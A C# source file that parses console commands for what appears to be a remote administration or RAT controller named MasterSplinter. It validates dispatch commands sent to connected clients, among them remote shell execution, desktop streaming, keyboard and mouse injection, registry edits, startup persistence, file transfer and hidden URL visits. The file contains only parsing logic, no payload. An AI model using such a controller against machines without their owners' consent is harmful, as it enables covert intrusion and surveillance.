using System;
using System.Collections.Generic;

namespace MasterSplinter.Cli
{
    public sealed class ListenCommand
    {
        private ListenCommand(
            string verb,
            string clientId,
            string dispatchCommand,
            string path,
            string newPath,
            string pathType,
            string name,
            string newName,
            string kind,
            string data,
            string shellCommand,
            int? quality,
            int? displayIndex,
            int? frames,
            int? frameDelayMilliseconds,
            string mouseAction,
            int? x,
            int? y,
            int? monitorIndex,
            byte? key,
            bool? keyDown,
            string startupType,
            int? pid,
            string action,
            string caption,
            string text,
            string button,
            string icon,
            string url,
            bool hidden,
            string localAddress,
            ushort? localPort,
            string remoteAddress,
            ushort? remotePort,
            string remotePath,
            string outputPath)
        {
            Verb = verb;
            ClientId = clientId;
            DispatchCommand = dispatchCommand;
            Path = path;
            NewPath = newPath;
            PathType = pathType;
            Name = name;
            NewName = newName;
            Kind = kind;
            Data = data;
            ShellCommand = shellCommand;
            Quality = quality;
            DisplayIndex = displayIndex;
            Frames = frames;
            FrameDelayMilliseconds = frameDelayMilliseconds;
            MouseAction = mouseAction;
            X = x;
            Y = y;
            MonitorIndex = monitorIndex;
            Key = key;
            KeyDown = keyDown;
            StartupType = startupType;
            Pid = pid;
            Action = action;
            Caption = caption;
            Text = text;
            Button = button;
            Icon = icon;
            Url = url;
            Hidden = hidden;
            LocalAddress = localAddress;
            LocalPort = localPort;
            RemoteAddress = remoteAddress;
            RemotePort = remotePort;
            RemotePath = remotePath;
            OutputPath = outputPath;
        }

        public string Verb { get; }
        public string ClientId { get; }
        public string DispatchCommand { get; }
        public string Path { get; }
        public string NewPath { get; }
        public string PathType { get; }
        public string Name { get; }
        public string NewName { get; }
        public string Kind { get; }
        public string Data { get; }
        public string ShellCommand { get; }
        public int? Quality { get; }
        public int? DisplayIndex { get; }
        public int? Frames { get; }
        public int? FrameDelayMilliseconds { get; }
        public string MouseAction { get; }
        public int? X { get; }
        public int? Y { get; }
        public int? MonitorIndex { get; }
        public byte? Key { get; }
        public bool? KeyDown { get; }
        public string StartupType { get; }
        public int? Pid { get; }
        public string Action { get; }
        public string Caption { get; }
        public string Text { get; }
        public string Button { get; }
        public string Icon { get; }
        public string Url { get; }
        public bool Hidden { get; }
        public string LocalAddress { get; }
        public ushort? LocalPort { get; }
        public string RemoteAddress { get; }
        public ushort? RemotePort { get; }
        public string RemotePath { get; }
        public string OutputPath { get; }

        public static ListenCommand Parse(string line)
        {
            string[] tokens = Tokenize(line);
            if (tokens.Length == 0)
                return new ListenCommand("empty", null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, false, null, null, null, null, null, null);

            string verb = tokens[0];
            if (string.Equals(verb, "exit", StringComparison.OrdinalIgnoreCase) ||
                string.Equals(verb, "quit", StringComparison.OrdinalIgnoreCase))
                return new ListenCommand("exit", null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, false, null, null, null, null, null, null);
            if (string.Equals(verb, "help", StringComparison.OrdinalIgnoreCase))
                return new ListenCommand("help", null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, false, null, null, null, null, null, null);
            if (string.Equals(verb, "clients", StringComparison.OrdinalIgnoreCase))
                return new ListenCommand("clients", null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, false, null, null, null, null, null, null);

            if (!string.Equals(verb, "dispatch", StringComparison.OrdinalIgnoreCase))
                throw new ArgumentException($"Unknown listen command '{verb}'.");
            if (tokens.Length < 3)
                throw new ArgumentException("Usage: dispatch <client-id|first> <command> [--path <path>] [--new-path <path>] [--type <file|directory>] [--pid <pid>] [--remote-path <client-path>] [--output <local-path>]");

            string clientId = tokens[1];
            string dispatchCommand = tokens[2];
            string path = null;
            string newPath = null;
            string pathType = null;
            string name = null;
            string newName = null;
            string kind = null;
            string data = null;
            string shellCommand = null;
            int? quality = null;
            int? displayIndex = null;
            int? frames = null;
            int? frameDelayMilliseconds = null;
            string mouseAction = null;
            int? x = null;
            int? y = null;
            int? monitorIndex = null;
            byte? key = null;
            bool? keyDown = null;
            string startupType = null;
            int? pid = null;
            string action = null;
            string caption = null;
            string text = null;
            string button = null;
            string icon = null;
            string url = null;
            bool hidden = false;
            string localAddress = null;
            ushort? localPort = null;
            string remoteAddress = null;
            ushort? remotePort = null;
            string remotePath = null;
            string outputPath = null;
            for (int index = 3; index < tokens.Length; index++)
            {
                if (string.Equals(tokens[index], "--path", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--path requires a value.");

                    path = tokens[index];
                }
                else if (string.Equals(tokens[index], "--new-path", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--new-path requires a value.");

                    newPath = tokens[index];
                }
                else if (string.Equals(tokens[index], "--type", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--type requires a value.");

                    pathType = tokens[index];
                }
                else if (string.Equals(tokens[index], "--name", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--name requires a value.");

                    name = tokens[index];
                }
                else if (string.Equals(tokens[index], "--new-name", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--new-name requires a value.");

                    newName = tokens[index];
                }
                else if (string.Equals(tokens[index], "--kind", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--kind requires a value.");

                    kind = tokens[index];
                }
                else if (string.Equals(tokens[index], "--data", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length)
                        throw new ArgumentException("--data requires a value.");

                    data = tokens[index];
                }
                else if (string.Equals(tokens[index], "--shell-command", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--shell-command requires a value.");

                    shellCommand = tokens[index];
                }
                else if (string.Equals(tokens[index], "--quality", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--quality requires a value.");

                    quality = int.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--display-index", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--display-index requires a value.");

                    displayIndex = int.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--frames", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--frames requires a value.");

                    frames = int.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--frame-delay-ms", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--frame-delay-ms requires a value.");

                    frameDelayMilliseconds = int.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--mouse-action", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--mouse-action requires a value.");

                    mouseAction = tokens[index];
                }
                else if (string.Equals(tokens[index], "--x", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--x requires a value.");

                    x = int.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--y", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--y requires a value.");

                    y = int.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--monitor-index", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--monitor-index requires a value.");

                    monitorIndex = int.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--key", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--key requires a value.");

                    key = byte.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--key-down", StringComparison.OrdinalIgnoreCase))
                {
                    keyDown = SetKeyDirection(keyDown, true);
                }
                else if (string.Equals(tokens[index], "--key-up", StringComparison.OrdinalIgnoreCase))
                {
                    keyDown = SetKeyDirection(keyDown, false);
                }
                else if (string.Equals(tokens[index], "--startup-type", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--startup-type requires a value.");

                    startupType = tokens[index];
                }
                else if (string.Equals(tokens[index], "--pid", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--pid requires a value.");

                    pid = int.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--action", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--action requires a value.");

                    action = tokens[index];
                }
                else if (string.Equals(tokens[index], "--caption", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--caption requires a value.");

                    caption = tokens[index];
                }
                else if (string.Equals(tokens[index], "--text", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--text requires a value.");

                    text = tokens[index];
                }
                else if (string.Equals(tokens[index], "--button", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--button requires a value.");

                    button = tokens[index];
                }
                else if (string.Equals(tokens[index], "--icon", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--icon requires a value.");

                    icon = tokens[index];
                }
                else if (string.Equals(tokens[index], "--url", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--url requires a value.");

                    url = tokens[index];
                }
                else if (string.Equals(tokens[index], "--hidden", StringComparison.OrdinalIgnoreCase))
                {
                    hidden = true;
                }
                else if (string.Equals(tokens[index], "--local-address", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--local-address requires a value.");

                    localAddress = tokens[index];
                }
                else if (string.Equals(tokens[index], "--local-port", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--local-port requires a value.");

                    localPort = ushort.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--remote-address", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--remote-address requires a value.");

                    remoteAddress = tokens[index];
                }
                else if (string.Equals(tokens[index], "--remote-port", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--remote-port requires a value.");

                    remotePort = ushort.Parse(tokens[index], System.Globalization.CultureInfo.InvariantCulture);
                }
                else if (string.Equals(tokens[index], "--remote-path", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--remote-path requires a value.");

                    remotePath = tokens[index];
                }
                else if (string.Equals(tokens[index], "--output", StringComparison.OrdinalIgnoreCase))
                {
                    index++;
                    if (index >= tokens.Length || string.IsNullOrWhiteSpace(tokens[index]))
                        throw new ArgumentException("--output requires a value.");

                    outputPath = tokens[index];
                }
                else
                {
                    throw new ArgumentException($"Unknown dispatch argument '{tokens[index]}'.");
                }
            }

            if ((string.Equals(dispatchCommand, "get-directory", StringComparison.OrdinalIgnoreCase) ||
                string.Equals(dispatchCommand, "get-registry-key", StringComparison.OrdinalIgnoreCase) ||
                string.Equals(dispatchCommand, "registry-create-key", StringComparison.OrdinalIgnoreCase) ||
                string.Equals(dispatchCommand, "start-process", StringComparison.OrdinalIgnoreCase) ||
                string.Equals(dispatchCommand, "download-file", StringComparison.OrdinalIgnoreCase)) &&
                string.IsNullOrWhiteSpace(path))
                throw new ArgumentException($"--path is required for {dispatchCommand}.");

            if (string.Equals(dispatchCommand, "registry-delete-key", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(path))
                    throw new ArgumentException("--path is required for registry-delete-key.");
                if (string.IsNullOrWhiteSpace(name))
                    throw new ArgumentException("--name is required for registry-delete-key.");
            }

            if (string.Equals(dispatchCommand, "registry-rename-key", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(path))
                    throw new ArgumentException("--path is required for registry-rename-key.");
                if (string.IsNullOrWhiteSpace(name))
                    throw new ArgumentException("--name is required for registry-rename-key.");
                if (string.IsNullOrWhiteSpace(newName))
                    throw new ArgumentException("--new-name is required for registry-rename-key.");
            }

            if (string.Equals(dispatchCommand, "registry-create-value", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(path))
                    throw new ArgumentException("--path is required for registry-create-value.");
                if (string.IsNullOrWhiteSpace(kind))
                    throw new ArgumentException("--kind is required for registry-create-value.");
            }

            if (string.Equals(dispatchCommand, "registry-delete-value", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(path))
                    throw new ArgumentException("--path is required for registry-delete-value.");
                if (string.IsNullOrWhiteSpace(name))
                    throw new ArgumentException("--name is required for registry-delete-value.");
            }

            if (string.Equals(dispatchCommand, "registry-rename-value", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(path))
                    throw new ArgumentException("--path is required for registry-rename-value.");
                if (string.IsNullOrWhiteSpace(name))
                    throw new ArgumentException("--name is required for registry-rename-value.");
                if (string.IsNullOrWhiteSpace(newName))
                    throw new ArgumentException("--new-name is required for registry-rename-value.");
            }

            if (string.Equals(dispatchCommand, "registry-change-value", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(path))
                    throw new ArgumentException("--path is required for registry-change-value.");
                if (string.IsNullOrWhiteSpace(name))
                    throw new ArgumentException("--name is required for registry-change-value.");
                if (string.IsNullOrWhiteSpace(kind))
                    throw new ArgumentException("--kind is required for registry-change-value.");
                if (data == null)
                    throw new ArgumentException("--data is required for registry-change-value.");
            }

            if (string.Equals(dispatchCommand, "shell-execute", StringComparison.OrdinalIgnoreCase) &&
                string.IsNullOrWhiteSpace(shellCommand))
                throw new ArgumentException("--shell-command is required for shell-execute.");

            if (string.Equals(dispatchCommand, "get-desktop", StringComparison.OrdinalIgnoreCase) ||
                string.Equals(dispatchCommand, "get-desktop-stream", StringComparison.OrdinalIgnoreCase))
            {
                if (quality.HasValue && (quality.Value < 1 || quality.Value > 100))
                    throw new ArgumentException("--quality must be between 1 and 100.");
                if (displayIndex.HasValue && displayIndex.Value < 0)
                    throw new ArgumentException("--display-index must be zero or greater.");
                if (frames.HasValue && frames.Value < 1)
                    throw new ArgumentException("--frames must be one or greater.");
                if (frameDelayMilliseconds.HasValue && frameDelayMilliseconds.Value < 0)
                    throw new ArgumentException("--frame-delay-ms must be zero or greater.");
            }

            if (string.Equals(dispatchCommand, "mouse-event", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(mouseAction))
                    throw new ArgumentException("--mouse-action is required for mouse-event.");
                if (!x.HasValue)
                    throw new ArgumentException("--x is required for mouse-event.");
                if (!y.HasValue)
                    throw new ArgumentException("--y is required for mouse-event.");
                if (!monitorIndex.HasValue)
                    throw new ArgumentException("--monitor-index is required for mouse-event.");
            }

            if (string.Equals(dispatchCommand, "keyboard-event", StringComparison.OrdinalIgnoreCase))
            {
                if (!key.HasValue)
                    throw new ArgumentException("--key is required for keyboard-event.");
                if (!keyDown.HasValue)
                    throw new ArgumentException("--key-down or --key-up is required for keyboard-event.");
            }

            if (string.Equals(dispatchCommand, "upload-file", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(path))
                    throw new ArgumentException("--path is required for upload-file.");
                if (string.IsNullOrWhiteSpace(remotePath))
                    throw new ArgumentException("--remote-path is required for upload-file.");
            }

            if (string.Equals(dispatchCommand, "rename-path", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(path))
                    throw new ArgumentException("--path is required for rename-path.");
                if (string.IsNullOrWhiteSpace(newPath))
                    throw new ArgumentException("--new-path is required for rename-path.");
                if (string.IsNullOrWhiteSpace(pathType))
                    throw new ArgumentException("--type is required for rename-path.");
            }

            if (string.Equals(dispatchCommand, "delete-path", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(path))
                    throw new ArgumentException("--path is required for delete-path.");
                if (string.IsNullOrWhiteSpace(pathType))
                    throw new ArgumentException("--type is required for delete-path.");
            }

            if (string.Equals(dispatchCommand, "end-process", StringComparison.OrdinalIgnoreCase) &&
                !pid.HasValue)
                throw new ArgumentException("--pid is required for end-process.");

            if (string.Equals(dispatchCommand, "shutdown-action", StringComparison.OrdinalIgnoreCase) &&
                string.IsNullOrWhiteSpace(action))
                throw new ArgumentException("--action is required for shutdown-action.");

            if (string.Equals(dispatchCommand, "show-message", StringComparison.OrdinalIgnoreCase) &&
                string.IsNullOrWhiteSpace(text))
                throw new ArgumentException("--text is required for show-message.");

            if (string.Equals(dispatchCommand, "visit-website", StringComparison.OrdinalIgnoreCase) &&
                string.IsNullOrWhiteSpace(url))
                throw new ArgumentException("--url is required for visit-website.");

            if (string.Equals(dispatchCommand, "startup-add", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(name))
                    throw new ArgumentException("--name is required for startup-add.");
                if (string.IsNullOrWhiteSpace(path))
                    throw new ArgumentException("--path is required for startup-add.");
                if (string.IsNullOrWhiteSpace(startupType))
                    throw new ArgumentException("--startup-type is required for startup-add.");
            }

            if (string.Equals(dispatchCommand, "startup-remove", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(name))
                    throw new ArgumentException("--name is required for startup-remove.");
                if (string.IsNullOrWhiteSpace(startupType))
                    throw new ArgumentException("--startup-type is required for startup-remove.");
            }

            if (string.Equals(dispatchCommand, "close-connection", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(localAddress))
                    throw new ArgumentException("--local-address is required for close-connection.");
                if (!localPort.HasValue)
                    throw new ArgumentException("--local-port is required for close-connection.");
                if (string.IsNullOrWhiteSpace(remoteAddress))
                    throw new ArgumentException("--remote-address is required for close-connection.");
                if (!remotePort.HasValue)
                    throw new ArgumentException("--remote-port is required for close-connection.");
            }

            return new ListenCommand(
                "dispatch",
                clientId,
                dispatchCommand,
                path,
                newPath,
                pathType,
                name,
                newName,
                kind,
                data,
                shellCommand,
                quality,
                displayIndex,
                frames,
                frameDelayMilliseconds,
                mouseAction,
                x,
                y,
                monitorIndex,
                key,
                keyDown,
                startupType,
                pid,
                action,
                caption,
                text,
                button,
                icon,
                url,
                hidden,
                localAddress,
                localPort,
                remoteAddress,
                remotePort,
                remotePath,
                outputPath);
        }

        private static bool SetKeyDirection(bool? existing, bool value)
        {
            if (existing.HasValue && existing.Value != value)
                throw new ArgumentException("--key-down and --key-up cannot both be specified.");

            return value;
        }

        private static string[] Tokenize(string line)
        {
            if (string.IsNullOrWhiteSpace(line))
                return Array.Empty<string>();

            var tokens = new List<string>();
            var current = new System.Text.StringBuilder();
            bool inQuotes = false;

            foreach (char character in line)
            {
                if (character == '"')
                {
                    inQuotes = !inQuotes;
                    continue;
                }

                if (char.IsWhiteSpace(character) && !inQuotes)
                {
                    AddToken(tokens, current);
                    continue;
                }

                current.Append(character);
            }

            if (inQuotes)
                throw new ArgumentException("Unterminated quote in listen command.");

            AddToken(tokens, current);
            return tokens.ToArray();
        }

        private static void AddToken(List<string> tokens, System.Text.StringBuilder current)
        {
            if (current.Length == 0)
                return;

            tokens.Add(current.ToString());
            current.Clear();
        }
    }
}
